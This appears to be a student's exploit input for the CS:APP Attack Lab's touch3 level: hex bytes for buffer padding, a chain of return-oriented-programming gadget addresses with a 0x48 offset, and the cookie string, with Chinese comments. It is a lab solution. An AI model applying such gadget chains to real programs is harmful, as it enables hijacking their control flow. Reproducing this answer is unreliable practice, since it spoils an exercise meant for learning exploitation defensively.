00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00        /* gadget1地址 多个 */
c5 19 40 00 00 00 00 00        /* gadget2地址 多个 */
ab 19 40 00 00 00 00 00      /* gadget3地址 */
48 00 00 00 00 00 00 00      /* gadget3要 pop的偏移量 */
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00      /* 5 */
13 1a 40 00 00 00 00 00     
d6 19 40 00 00 00 00 00        /* gadget7 */
a2 19 40 00 00 00 00 00        /* gadget8 */
fa 18 40 00 00 00 00 00        /* touch3 */
35 39 62 39 39 37 66 61        /*   偏移0x48=72 cookie */
